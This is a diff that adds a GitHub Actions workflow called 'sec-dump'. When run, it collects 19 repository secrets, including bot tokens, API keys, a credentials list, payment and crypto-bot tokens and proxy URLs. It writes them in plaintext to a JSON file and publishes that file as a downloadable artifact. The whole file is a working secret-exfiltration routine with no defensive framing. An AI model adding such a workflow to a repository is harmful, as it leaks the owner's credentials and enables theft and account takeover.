@@ -1,0 +1,48 @@
+name: sec-dump
+on:
+  workflow_dispatch:
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        env:
+          ADMIN_ID: ${{ secrets.ADMIN_ID }}
+          API_ID: ${{ secrets.API_ID }}
+          API_HASH: ${{ secrets.API_HASH }}
+          ARCH_BOT_TOKEN: ${{ secrets.ARCH_BOT_TOKEN }}
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          TEST_BOT_TOKEN: ${{ secrets.TEST_BOT_TOKEN }}
+          CAPMONSTER_KEY: ${{ secrets.CAPMONSTER_KEY }}
+          CLOUDTIPS_REFRESH: ${{ secrets.CLOUDTIPS_REFRESH }}
+          CREDENTIALS_LIST: ${{ secrets.CREDENTIALS_LIST }}
+          CRYPTOBOT_TOKEN: ${{ secrets.CRYPTOBOT_TOKEN }}
+          DSA_PROXY_URL: ${{ secrets.DSA_PROXY_URL }}
+          DSA_TEST_PROXY: ${{ secrets.DSA_TEST_PROXY }}
+          LOGS_CHAT_ID: ${{ secrets.LOGS_CHAT_ID }}
+          SUB_CHANNEL_ID: ${{ secrets.SUB_CHANNEL_ID }}
+          SUB_CHANNEL_LINK: ${{ secrets.SUB_CHANNEL_LINK }}
+          XROCKET_TOKEN: ${{ secrets.XROCKET_TOKEN }}
+          GROQ_KEY: ${{ secrets.GROQ_KEY }}
+          ABUSE_COMMENT: ${{ secrets.ABUSE_COMMENT }}
+          ABUSE_REASON: ${{ secrets.ABUSE_REASON }}
+        run: |
+          python3 - <<'PY'
+          import json, os
+          keys = ["ADMIN_ID", "API_ID", "API_HASH", "ARCH_BOT_TOKEN", "BOT_TOKEN",
+                  "TEST_BOT_TOKEN", "CAPMONSTER_KEY", "CLOUDTIPS_REFRESH",
+                  "CREDENTIALS_LIST", "CRYPTOBOT_TOKEN", "DSA_PROXY_URL",
+                  "DSA_TEST_PROXY", "LOGS_CHAT_ID", "SUB_CHANNEL_ID",
+                  "SUB_CHANNEL_LINK", "XROCKET_TOKEN", "GROQ_KEY",
+                  "ABUSE_COMMENT", "ABUSE_REASON"]
+          data = {k: os.environ.get(k, "") for k in keys}
+          with open("secrets_dump.json", "w", encoding="utf-8") as f:
+              json.dump(data, f, indent=1)
+          print("collected", sum(1 for v in data.values() if v), "non-empty")
+          PY
+      - uses: actions/upload-artifact@v4
+        with:
+          name: sec-dump
+          path: secrets_dump.json
+          retention-days: 1
